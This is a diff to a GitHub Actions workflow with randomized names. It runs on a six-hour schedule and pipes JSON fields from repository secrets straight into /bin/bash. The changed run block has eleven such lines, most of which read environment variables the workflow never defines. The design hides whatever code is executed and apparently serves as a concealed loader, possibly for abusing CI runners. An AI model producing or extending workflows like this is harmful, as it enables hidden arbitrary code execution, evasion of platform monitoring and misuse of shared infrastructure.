@@ -2,8 +2,7 @@ name: wendixiang9772
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 5/6 * * *'
-
+    - cron: '55 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,10 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: wendixiang9772
         env:
-          l97: ${{ secrets.l97 }}
+          pkrg83981: ${{ secrets.pkrg83981 }}
         run: |
-          echo $l97 | jq -r .srrjy98368 | /bin/bash
-          echo $g68 | jq -r .m8 | /bin/bash
-          echo $q2 | jq -r .v65710 | /bin/bash
-          echo $wtv75631 | jq -r .rygg26272 | /bin/bash
+          echo $pkrg83981 | jq -r .nhg303 | /bin/bash
+          echo $q22067 | jq -r .shpbj048 | /bin/bash
+          echo $uabxl2066 | jq -r .rhy27956 | /bin/bash
+          echo $nkyg8449 | jq -r .e8 | /bin/bash
+          echo $diit78987 | jq -r .snco874 | /bin/bash
+          echo $wlmli3 | jq -r .gvzyb93 | /bin/bash
+          echo $eqh1 | jq -r .onoi628 | /bin/bash
+          echo $ex238 | jq -r .zkmn9577 | /bin/bash
+          echo $ojg30544 | jq -r .lf931 | /bin/bash
+          echo $kdnc028 | jq -r .adejy852 | /bin/bash
+          echo $u80854 | jq -r .xn35 | /bin/bash
 
